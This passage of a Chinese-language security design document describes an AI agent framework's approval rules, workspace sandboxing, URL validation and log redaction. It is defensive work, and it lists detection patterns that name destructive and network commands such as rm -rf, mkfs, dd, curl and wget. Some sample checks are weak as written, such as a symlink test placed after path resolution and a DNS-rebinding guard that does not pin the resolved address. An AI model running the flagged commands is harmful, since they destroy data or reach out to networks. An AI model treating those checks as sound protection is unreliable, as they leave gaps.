    - "DROP\\s+(TABLE|DATABASE)"                  # SQL 删除
    - "DELETE\\s+FROM.*WHERE\\s+1=1"             # SQL 批量删除
  action: require_approval
  reason: "检测到高风险操作（系统文件/数据库删除）"
```

**Medium（中等风险）** - 可疑模式：

```yaml
medium:
  patterns:
    - "https?://[^/]*\\d+\\.\\d+\\.\\d+\\.\\d+"  # IP 地址 URL
    - "\\bexec\\s*\\("                            # 代码执行
    - "\\beval\\s*\\("                            # 动态执行
    - "\\.env$"                                   # 环境变量文件
  action: require_approval
  reason: "检测到可疑模式（代码执行/环境变量）"
```

### 2.3 工具特定规则

**run_bash_command** 审批规则：

```yaml
run_bash_command:
  enabled: true
  patterns:
    high_risk:
      - "rm\\s+-rf"            # 强制删除
      - "sudo"                 # 提权操作
      - "chmod\\s+777"         # 危险权限
      - "mkfs"                 # 格式化磁盘
      - "dd.*if=/dev/"         # 磁盘写入
    medium_risk:
      - "curl"                 # 网络请求
      - "wget"                 # 下载文件
      - "pip\\s+install"       # 安装包
  actions:
    high_risk: require_approval
    medium_risk: require_approval
```

**http_fetch** 审批规则：

```yaml
http_fetch:
  enabled: true
  rules:
    - pattern: "localhost|127\\.0\\.0\\.1"       # 本地地址
      action: require_approval
      reason: "访问本地服务"
    - pattern: "192\\.168\\.|10\\."              # 内网地址
      action: require_approval
      reason: "访问内网地址"
```

### 2.4 审批用户体验

**极简版审批界面**（对 LLM 透明）：

```
🛡️  工具审批: run_bash_command
   风险级别: high
   原因: 检测到高风险操作
   命令: rm -rf /tmp/cache
   批准? [y/n] > n

❌ 操作已取消
```

**关键设计**：
- ✅ 审批决策**不进入对话历史**（LLM 无感知）
- ✅ 用户可**批准/拒绝**操作
- ✅ 拒绝后 Agent 自动调整策略
- ✅ 完整的审批日志记录

**配置路径**: `generalAgent/config/hitl_rules.yaml`

---

## 3. 工作区隔离与文件安全

### 3.1 工作区架构

每个会话拥有独立的文件系统沙箱：

```
data/workspace/{session_id}/
├── skills/           # 符号链接（只读）
│   └── pdf/
│       ├── SKILL.md
│       └── scripts/
├── uploads/          # 用户上传（可读写）
├── outputs/          # Agent 生成输出（可读写）
└── temp/             # 临时文件（可读写）
```

### 3.2 文件访问安全策略

| 操作 | 允许路径 | 禁止路径 | 验证方式 |
|------|---------|---------|---------|
| **读取** | `workspace/**/*` | `workspace/` 外的任何路径 | `_validate_workspace_path()` |
| **写入** | `outputs/`, `temp/`, `uploads/` | `skills/`, `workspace/` 外 | `_validate_write_path()` |
| **执行** | `skills/*/scripts/*.py` | 其他所有路径 | `_validate_script_path()` |
| **删除** | `outputs/`, `temp/` | `skills/`, `uploads/` | `_validate_delete_path()` |

### 3.3 路径安全实现

**路径规范化**（防止路径遍历）：

```python
def _validate_workspace_path(self, file_path: str) -> Path:
    """验证路径是否在 workspace 内（防止 ../ 攻击）"""
    # 1. 解析为绝对路径
    abs_path = (self.workspace_path / file_path).resolve()

    # 2. 检查是否在 workspace 内
    if not abs_path.is_relative_to(self.workspace_path):
        raise SecurityError(f"Path outside workspace: {file_path}")

    # 3. 检查符号链接（防止软链接逃逸）
    if abs_path.is_symlink():
        real_path = abs_path.readlink()
        if not real_path.is_relative_to(self.workspace_path):
            raise SecurityError(f"Symlink escape detected: {file_path}")

    return abs_path
```

**写入路径限制**：

```python
def _validate_write_path(self, file_path: str) -> Path:
    """验证写入路径（只允许 outputs/、temp/、uploads/）"""
    abs_path = self._validate_workspace_path(file_path)

    # 允许的写入目录
    allowed_dirs = ["outputs", "temp", "uploads"]

    # 检查路径是否在允许的目录下
    relative_path = abs_path.relative_to(self.workspace_path)
    if relative_path.parts[0] not in allowed_dirs:
        raise SecurityError(
            f"Write not allowed: {file_path}. "
            f"Only allowed in: {', '.join(allowed_dirs)}"
        )

    return abs_path
```

### 3.4 技能脚本执行安全

**隔离执行环境**：

```python
def execute_skill_script(self, script_path: str, args: list[str]) -> str:
    """执行技能脚本（受限环境）"""
    # 1. 验证脚本路径（必须在 skills/*/scripts/ 下）
    abs_script = self._validate_script_path(script_path)

    # 2. 设置环境变量（隔离）
    env = os.environ.copy()
    env["AGENT_WORKSPACE_PATH"] = str(self.workspace_path)
    env["PYTHONPATH"] = str(self.workspace_path)  # 限制 import

    # 3. 执行脚本（超时保护）
    result = subprocess.run(
        ["python", abs_script, *args],
        cwd=self.workspace_path,    # 限制工作目录
        env=env,                     # 隔离环境变量
        timeout=30,                  # 超时限制
        capture_output=True,
        text=True
    )

    return result.stdout
```

---

## 4. 网络安全

### 4.1 HTTP 请求安全策略

**fetch_web / http_fetch 工具**安全控制：

| 风险类型 | 检测模式 | 防护措施 |
|---------|---------|---------|
| **内网扫描** | `localhost`, `127.0.0.1`, `192.168.*`, `10.*` | HITL 审批 |
| **SSRF 攻击** | `file://`, `ftp://`, `gopher://` | 协议白名单（仅 http/https） |
| **敏感端口** | `:22`, `:3306`, `:5432`, `:6379` | HITL 审批 |
| **超长 URL** | URL 长度 > 2048 | 拒绝请求 |

**实现示例**：

```python
def _validate_url(self, url: str) -> None:
    """验证 URL 安全性"""
    # 1. 协议白名单
    if not url.startswith(("http://", "https://")):
        raise SecurityError(f"Invalid protocol: {url}")

    # 2. 解析 URL
    parsed = urllib.parse.urlparse(url)

    # 3. 检测内网地址
    ip_pattern = r"\d+\.\d+\.\d+\.\d+"
    if re.match(ip_pattern, parsed.hostname or ""):
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            raise SecurityError(f"Private IP detected: {url}")

    # 4. 检测 localhost
    if parsed.hostname in ("localhost", "127.0.0.1", "::1"):
        raise SecurityError(f"Localhost access denied: {url}")

    # 5. 长度限制
    if len(url) > 2048:
        raise SecurityError(f"URL too long: {len(url)} chars")
```

### 4.2 DNS Rebinding 防护

**问题**：攻击者通过 DNS 将域名先解析到公网 IP（通过验证），再解析到内网 IP（绕过防护）

**防护**：

```python
def fetch_with_dns_rebinding_protection(self, url: str) -> str:
    """防 DNS Rebinding 的网络请求"""
    # 1. 首次 DNS 解析
    hostname = urllib.parse.urlparse(url).hostname
    first_ip = socket.gethostbyname(hostname)

    # 2. 验证第一次解析的 IP
    if ipaddress.ip_address(first_ip).is_private:
        raise SecurityError(f"Private IP detected: {first_ip}")

    # 3. 发起请求前再次解析
    second_ip = socket.gethostbyname(hostname)

    # 4. 验证 IP 一致性
    if first_ip != second_ip:
        raise SecurityError(f"DNS rebinding detected: {first_ip} -> {second_ip}")

    # 5. 发起请求
    return requests.get(url, timeout=10).text
```

---

## 5. 数据隐私保护

### 5.1 本地优先原则

**数据存储策略**：

| 数据类型 | 存储位置 | 加密 | 访问控制 |
|---------|---------|------|---------|
| **会话历史** | `data/sessions.db` (SQLite) | ❌ 明文 | 文件系统权限 |
| **工作区文件** | `data/workspace/{session_id}/` | ❌ 明文 | 目录权限 + 路径隔离 |
| **日志文件** | `logs/` | ❌ 明文 | 文件系统权限 |
| **配置文件** | `.env`, `*.yaml` | ❌ 明文 | 文件系统权限 |
| **API Keys** | `.env` (环境变量) | ❌ 明文 | 文件系统权限 + `.gitignore` |

**关键原则**：
- ✅ **本地存储** - 所有数据保存在本地，不上传云端
- ✅ **文件权限** - 依赖操作系统文件权限（`chmod 600`）
- ✅ **`.gitignore`** - 敏感文件（`.env`, `data/`, `logs/`）排除版本控制
- ⚠️ **无加密** - 当前版本不提供静态数据加密（未来可选）

### 5.2 日志脱敏

**敏感信息过滤**：

```python
def sanitize_log_message(self, message: str) -> str:
    """日志脱敏（移除敏感信息）"""
    # 1. API Key 脱敏
    message = re.sub(
        r"(api[_-]?key['\"]?\s*[:=]\s*['\"]?)[\w-]+",
        r"\1***REDACTED***",
        message,
        flags=re.IGNORECASE
    )

    # 2. Token 脱敏
    message = re.sub(
        r"(token['\"]?\s*[:=]\s*['\"]?)[\w.-]+",
        r"\1***REDACTED***",
        message,
        flags=re.IGNORECASE
    )

    # 3. Password 脱敏
    message = re.sub(
        r"(password['\"]?\s*[:=]\s*['\"]?)[\w.-]+",
        r"\1***REDACTED***",
        message,
        flags=re.IGNORECASE
    )

    return message
```

### 5.3 LLM 调用隐私

**Prompt Token 限制**（防止敏感信息泄露）：

```python
# generalAgent/config/settings.py
class ObservabilitySettings(BaseSettings):
    log_prompt_max_length: int = Field(default=500)  # 日志中 Prompt 最大长度
```

**LangSmith 追踪**（可选，默认关闭）：

```bash
# .env
LANGCHAIN_TRACING_V2=false  # 默认关闭（防止敏感数据上传）
LANGSMITH_API_KEY=          # 留空
```

---

## 6. Prompt 安全

### 6.1 Jinja2 沙箱模式

**防止 Prompt 注入攻击**：

```python
from jinja2.sandbox import SandboxedEnvironment

def render_template_safely(template: str, params: dict) -> str:
    """使用沙箱环境渲染模板（防止代码执行）"""
    # 使用 SandboxedEnvironment（禁止 import、exec、eval 等）
    env = SandboxedEnvironment()

    # 渲染模板
    return env.from_string(template).render(**params)
```

**SandboxedEnvironment 限制**：
- ❌ 禁止 `{% import ... %}`
- ❌ 禁止 `{% exec ... %}`
- ❌ 禁止访问私有属性（`__xxx__`）
- ❌ 禁止调用危险函数（`eval`, `exec`, `compile`）

### 6.2 参数化 Prompt

**推荐模式**（防止注入）：

```python
# ✅ 推荐：参数化
template = "你是 {{ role }}。任务: {{ task }}"
prompt = render_template(template, {"role": user_input, "task": task_desc})

# ❌ 不推荐：字符串拼接
prompt = f"你是 {user_input}。任务: {task_desc}"  # 可能被注入
```

---

## 7. 依赖安全

### 7.1 Python 依赖管理

**锁定依赖版本**（`uv.lock`）：

```toml
# pyproject.toml
[project.dependencies]
langchain = "^0.3.15"
langgraph = "^0.2.62"
jinja2 = "^3.1.5"
```

**安全扫描**（推荐工具）：

```bash
# 1. pip-audit - 扫描已知漏洞
pip-audit

# 2. safety - 检查不安全的依赖
safety check

# 3. bandit - 静态代码分析
bandit -r generalAgent/
```

### 7.2 技能依赖隔离

**自动依赖安装**（`skills/*/requirements.txt`）：

```python
def install_skill_dependencies(self, skill_id: str) -> None:
    """安装技能依赖（隔离安装）"""
    requirements_file = self.skills_path / skill_id / "requirements.txt"

    if requirements_file.exists():
        # 使用虚拟环境隔离（可选）
        subprocess.run([
            "pip", "install", "-r", str(requirements_file),
            "--user",  # 用户级安装（非全局）
        ], check=True)
```

---

## 8. 运行时安全

### 8.1 循环控制

**防止无限循环**：

```bash
# .env
MAX_LOOPS=500  # Agent Loop 最大迭代次数（1-500）
```

```python
# generalAgent/graph/routing.py
def agent_route(state: AppState) -> Literal["tools", "finalize"]:
    """路由决策（带循环保护）"""
    # 检查循环次数
    if state["loops"] >= state.get("max_loops", 500):
        logger.warning(f"Max loops reached: {state['loops']}")
        return "finalize"  # 强制结束

    # 正常路由逻辑
    ...
```

### 8.2 超时保护

**工具执行超时**：

```python
# run_bash_command 工具
result = subprocess.run(
    command,
    timeout=30,  # 30 秒超时
    capture_output=True,
    text=True
)
```

**HTTP 请求超时**：

```python
# fetch_web 工具
response = requests.get(url, timeout=10)  # 10 秒超时
```

### 8.3 资源限制

**内存限制**（消息历史）：

```bash
# .env
MAX_MESSAGE_HISTORY=500  # 最多保留 500 条消息
```

**工作区清理**：

```bash
# CLI 命令
/clean  # 清理 7 天前的旧工作区
```

---

## 9. 安全配置最佳实践

### 9.1 生产环境配置

```bash
# .env (生产环境)

# ========== 安全配置 ==========
# 关闭自动审批（强制 HITL）
AUTO_APPROVE_WRITES=false

# 限制循环次数
MAX_LOOPS=100

# 关闭 LangSmith 追踪（防止数据泄露）
LANGCHAIN_TRACING_V2=false

# 限制上下文长度（防止 token 泄露）
CONTEXT_MAX_HISTORY_MESSAGES=100
```

```yaml
# hitl_rules.yaml (生产环境)
global:
  enabled: true                    # 启用审批
  default_action: ask              # 默认需审批（更严格）

  risk_patterns:
    critical:
      patterns:
        - "password"
        - "api_key"
        - "secret"
        - "token"
      action: require_approval
```

### 9.2 开发环境配置

```bash
# .env (开发环境)

# ========== 开发配置 ==========
# 可选开启自动审批（提高开发效率）
AUTO_APPROVE_WRITES=true  # ⚠️ 仅开发环境

# 启用 LangSmith 追踪（调试用）
LANGCHAIN_TRACING_V2=true
LANGSMITH_API_KEY=lsv2_xxx
```

```yaml
# hitl_rules.yaml (开发环境)
global:
  enabled: false  # ⚠️ 仅开发环境，禁用审批加速测试
```

### 9.3 安全检查清单

**部署前检查**：

- [ ] `.env` 文件已添加到 `.gitignore`
- [ ] `AUTO_APPROVE_WRITES=false`（生产环境）
- [ ] `LANGCHAIN_TRACING_V2=false`（生产环境）
- [ ] `hitl_rules.yaml` 启用全局风险模式
- [ ] `data/` 和 `logs/` 目录已排除版本控制
- [ ] 文件系统权限正确（`chmod 600 .env`）
- [ ] 依赖版本锁定（`uv.lock` 已提交）
- [ ] 运行 `pip-audit` 检查漏洞
- [ ] 运行 `bandit` 静态分析
- [ ] 工作区清理任务已配置

---

## 10. 安全事件响应

### 10.1 审批日志

**审批事件记录**：

```python
# generalAgent/hitl/approval_node.py
logger.warning(
    f"HITL Approval Required: tool={tool_name}, "
    f"risk={decision.risk_level}, reason={decision.reason}"
)
```

**日志格式**：

```
2025-10-31 22:00:00 WARNING HITL Approval Required:
  tool=run_bash_command,
  risk=high,
  reason=检测到高风险操作
  args={'command': 'rm -rf /tmp/cache'}
  user_decision=rejected
```

### 10.2 安全事件分类

| 级别 | 事件类型 | 示例 | 响应措施 |
|------|---------|------|---------|
| **Critical** | 敏感信息泄露 | API Key 出现在日志 | 立即轮换密钥 + 审查日志 |
| **High** | 系统文件访问 | 尝试读取 `/etc/passwd` | HITL 拦截 + 记录事件 |
| **Medium** | 内网请求 | 访问 `192.168.1.1` | HITL 审批 + 用户决策 |
| **Low** | 循环超限 | `loops >= max_loops` | 自动结束 + 日志记录 |

### 10.3 事件溯源

**审计日志查询**：

```bash
# 查找所有审批事件
grep "HITL Approval" logs/*.log

# 查找被拒绝的操作
grep "user_decision=rejected" logs/*.log

# 查找敏感信息检测
grep "敏感信息" logs/*.log
```

---

## 11. 已知限制与未来改进

### 11.1 当前限制

| 限制 | 影响 | 缓解措施 |
|------|------|---------|
| **无静态数据加密** | 本地文件可被直接读取 | 依赖文件系统权限 |
| **无网络加密** | LLM API 调用依赖 HTTPS | 使用官方 SDK（自动 TLS） |
| **无身份认证** | 单用户使用 | 多用户需外部鉴权 |
| **无访问控制** | 所有会话可见 | 依赖操作系统用户隔离 |
| **日志明文** | 敏感信息可能泄露 | 日志脱敏 + 定期清理 |

### 11.2 未来改进方向

**短期（v4.0）**：
- [ ] 日志敏感信息自动脱敏
- [ ] 工作区文件自动加密（可选）
- [ ] 审批事件导出（JSON/CSV）

**中期（v4.5）**：
- [ ] 基于角色的访问控制（RBAC）
- [ ] 多租户会话隔离
- [ ] 审计日志可视化 Dashboard

**长期（v5.0）**：
- [ ] 端到端加密（E2EE）
- [ ] 零知识证明（ZKP）Prompt 保护
- [ ] 联邦学习（Federated Learning）支持

---

## 12. 安全合规

### 12.1 数据保护法规

**GDPR（欧盟）合规性**：

| 要求 | 框架支持 | 说明 |
|------|---------|------|
| **数据最小化** | ✅ | 本地存储，不上传云端 |
| **访问权利** | ✅ | 用户可直接访问 `data/` 目录 |
| **删除权利** | ✅ | `/reset` 命令删除会话 |
| **数据便携性** | ✅ | SQLite 数据库可导出 |
| **加密要求** | ⚠️ | 当前无静态加密（可选） |

**CCPA（加州）合规性**：

| 要求 | 框架支持 | 说明 |
|------|---------|------|
| **知情权** | ✅ | 本地存储，用户完全可见 |
| **删除权** | ✅ | `/reset` 或删除 `data/` |
| **选择退出** | ✅ | 不收集遥测数据 |

### 12.2 企业安全标准

**SOC 2 Type II** 考虑：

- ✅ **访问控制**: 文件系统权限
- ✅ **审计日志**: 完整的审批和操作日志
- ✅ **数据隔离**: 工作区隔离机制
- ⚠️ **加密**: 当前无静态数据加密
- ⚠️ **身份验证**: 依赖外部系统

---

## 13. 安全联系方式

**安全漏洞报告**：
- 邮箱: `security@example.com`（请替换为实际邮箱）
- GitHub: [Security Advisory](https://github.com/your-org/agentsgraph/security/advisories)

**负责任的披露政策**：
1. 发现漏洞后，请私下报告（不公开披露）
2. 我们将在 **7 个工作日**内响应
3. 修复后，我们将在 **90 天内**发布补丁
4. 公开披露时会致谢安全研究人员

---

## 14. 总结

AgentGraph 框架通过多层防护机制实现安全和隐私保护：

**安全三大支柱**：
1. **HITL 人机协同** - 四层审批规则拦截危险操作
2. **工作区隔离** - 文件系统沙箱防止路径遍历
3. **配置化安全** - 灵活的安全策略适配不同环境

**隐私保护原则**：
- ✅ **本地优先** - 所有数据保存本地
- ✅ **最小化** - 仅收集必要信息
- ✅ **透明** - 用户可直接访问数据
- ✅ **可控** - 用户可删除所有数据

**安全最佳实践**：
- 生产环境关闭 `AUTO_APPROVE_WRITES`
- 启用 HITL 全局风险模式
- 定期运行安全扫描（`pip-audit`, `bandit`）
- 审查审批日志，发现异常行为

**持续改进**：
框架安全特性将持续演进，欢迎社区贡献和安全研究人员的反馈。

---

**文档版本**: v3.6
**最后更新**: 2025-10-31
